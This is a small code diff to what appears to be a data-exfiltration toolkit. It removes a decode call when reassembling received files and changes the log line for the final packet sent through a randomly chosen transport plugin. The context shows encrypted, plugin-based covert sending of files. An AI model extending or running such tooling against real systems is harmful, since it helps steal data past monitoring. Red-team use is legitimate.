@@ -191,7 +191,7 @@ class Exfiltration(object):
         fname = files[jobid]['filename']
         filename = "%s.%s" % (fname.replace(
             os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
-        content = ''.join(str(v) for v in files[jobid]['data']).decode()
+        content = ''.join(str(v) for v in files[jobid]['data'])
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
@@ -292,7 +292,7 @@ class ExfiltrateFile(threading.Thread):
 
         # last packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-        ok("Using {0} as transport method".format(plugin_name))
+        warning("LAST PACKET: Using {0} as transport method".format(plugin_name))
         data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
         plugin_send_function(data)
         f.close()
